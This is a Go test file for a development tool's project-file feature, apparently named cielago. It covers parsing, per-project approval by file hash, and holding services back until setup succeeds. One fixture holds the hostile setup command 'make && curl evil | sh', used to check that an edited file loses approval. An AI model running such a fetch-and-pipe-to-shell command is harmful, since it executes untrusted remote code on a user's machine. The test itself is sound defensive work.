package main

import (
	"io"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestAProjectFileTakesSetupServicesAndPortsOnly(t *testing.T) {
	p, err := parseProject([]byte("setup = \"pnpm install\"\nservices = [\"pnpm dev\", \"pnpm worker\"]\n"))
	if err != nil || p.Setup != "pnpm install" || strings.Join(p.Services, ",") != "pnpm dev,pnpm worker" || len(p.Hash) != 64 {
		t.Fatalf("project = %+v, %v", p, err)
	}
	for body, want := range map[string]string{
		"setup = \"x\"\nbuild = \"y\"\n": "unknown key",
		"":                               "no setup, services or ports",
		"services = [\"\"]\n":            "can't be empty",
		"setup = [\n":                    projectFile,
		"setup = \"  \"\n":               "setup can't be empty",
		"setup = \"make\\u001b[2K\"\n":   "control characters",
	} {
		if _, err := parseProject([]byte(body)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("parseProject(%q) = %v, want an error about %q", body, err, want)
		}
	}
}

func TestAllowApprovesThatFileInThatProjectOnly(t *testing.T) {
	f := newFixture(t)
	body := "setup = \"make\"\n"
	f.write(f.local, projectFile, body)
	f.write(f.remote, projectFile, body)
	approved := func(root string) bool {
		t.Helper()
		p, err := approvedProject(f.machine(), root)
		if p == nil && err == nil {
			t.Fatalf("no project file at %s", root)
		}
		return err == nil
	}
	if approved(f.local) {
		t.Fatal("a new project file counted as approved")
	}
	if err := allowProject(filepath.Join(f.local, "deep"), strings.NewReader("n\n"), io.Discard); err == nil {
		t.Fatal("allow ran from a folder that doesn't exist")
	}
	if err := allowProject(f.local, strings.NewReader("n\n"), io.Discard); err != nil || approved(f.local) {
		t.Fatalf("answering no still approved it: %v", err)
	}
	f.allow(f.local)
	if !approved(f.local) {
		t.Fatal("after cielago allow it still wasn't approved")
	}
	if approved(f.remote) {
		t.Error("approving one project's file also approved the same file in another project")
	}
	f.write(f.local, projectFile, "setup = \"make && curl evil | sh\"\n")
	if approved(f.local) {
		t.Error("an edited project file stayed approved")
	}
	f.allow(f.local)
	f.write(f.local, projectFile, body)
	if approved(f.local) {
		t.Error("an older version stayed approved after a newer one was allowed")
	}
}

func TestAnUnapprovedProjectFileRunsNothing(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"echo ran > setup.txt\"\n")
	res, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999990").Run()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Noted(), "cielago allow") {
		t.Errorf("notes = %q", res.Noted())
	}
	if waitForFile(t, filepath.Join(f.remote, "setup.txt"), 2*time.Second) {
		t.Error("an unapproved setup ran")
	}
}

func TestServicesStartOnlyAfterSetupSucceeds(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"sleep 1 && echo ready > setup.txt\"\nservices = [\"cat setup.txt > served.tmp && mv served.tmp served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999991"
	if res, err := f.handoffWithProject(id).Run(); err != nil || len(res.Notes) > 0 {
		t.Fatalf("handoff: %v, notes %q", err, res.Noted())
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Fatal("the service never started")
	}
	if got := strings.TrimSpace(f.read(f.remote, "served.txt")); got != "ready" {
		t.Errorf("the service started before setup finished: served.txt = %q", got)
	}
	if got := strings.TrimSpace(f.read(filepath.Join(f.home, ".cielago", "setup"), id)); got != "ok" {
		t.Errorf("setup status = %q", got)
	}
	panes, _ := exec.Command("tmux", "list-panes", "-a", "-F", "#{window_name}").Output()
	if got := strings.Count(string(panes), "api · claude"); got != 3 {
		t.Errorf("the Claude tab has %d panes, want Claude, setup and the service:\n%s", got, panes)
	}
}

func TestAFailedSetupKeepsServicesFromStarting(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "setup = \"exit 3\"\nservices = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	id := "0f0f0f0f-1111-2222-3333-999999999992"
	if _, err := f.handoffWithProject(id).Run(); err != nil {
		t.Fatal(err)
	}
	status := filepath.Join(f.home, ".cielago", "setup", id)
	deadline := time.Now().Add(10 * time.Second)
	for f.read(filepath.Dir(status), id) == "" && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
	}
	if got := strings.TrimSpace(f.read(filepath.Dir(status), id)); got != "failed" {
		t.Fatalf("setup status = %q", got)
	}
	if waitForFile(t, filepath.Join(f.remote, "served.txt"), 2*time.Second) {
		t.Error("a service started although setup failed")
	}
}

func TestServicesWithoutSetupStartRightAway(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	f.write(f.local, projectFile, "services = [\"echo up > served.txt\"]\n")
	f.allow(f.local)
	if _, err := f.handoffWithProject("0f0f0f0f-1111-2222-3333-999999999993").Run(); err != nil {
		t.Fatal(err)
	}
	if !waitForFile(t, filepath.Join(f.remote, "served.txt"), 10*time.Second) {
		t.Error("the service never started")
	}
}
